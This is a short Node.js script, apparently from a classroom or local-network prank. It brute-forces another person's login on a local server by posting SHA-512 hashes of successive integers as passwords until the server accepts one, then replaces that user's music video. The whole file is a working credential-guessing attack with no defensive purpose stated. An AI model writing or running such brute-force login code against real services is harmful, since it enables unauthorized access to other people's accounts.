/** use sha 512

hack jons password and change the music
0-99

each new hack will add 100 to the previous range
*/

var url = require('url');
var crypto = require('crypto');
var queryString = require('querystring');
var http = require('http');

var startValue = 0;

var hack = function(startValue) {

  // create
  var sha512 = crypto.createHash('sha512');

  sha512.update(startValue.toString());

  var output = sha512.digest('hex');

  var postData = queryString.stringify({
    'name' : 'not nolan',
    'password' : output,
    'video' : 'https://www.youtube.com/watch?v=eNobp7OnlJw'
  });

  var options = {
    hostname: '10.0.1.2',
    port: 1337,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': postData.length
    }
  };

  var req = http.request(options, function(res) {
    // console.log('STATUS: ' + res.statusCode);
    // console.log('HEADERS: ' + JSON.stringify(res.headers));
    res.setEncoding('utf8');
    res.on('data', function (chunk) {
      console.log('BODY: ' + chunk);
      var responseObject = JSON.parse(chunk.toString());
      if (responseObject.success === false) {

        hack(++startValue);
      } else {
        console.log('hacked!');
        return true;
      }
    });

    res.on('end', function() {
      console.log('No more data in response.');
    })
  });

  req.on('error', function(e) {
    console.log('problem with request: ' + e.message);
  });

  // write data to request body
  req.write(postData);
  req.end();

  console.log(startValue);

};

hack(startValue);


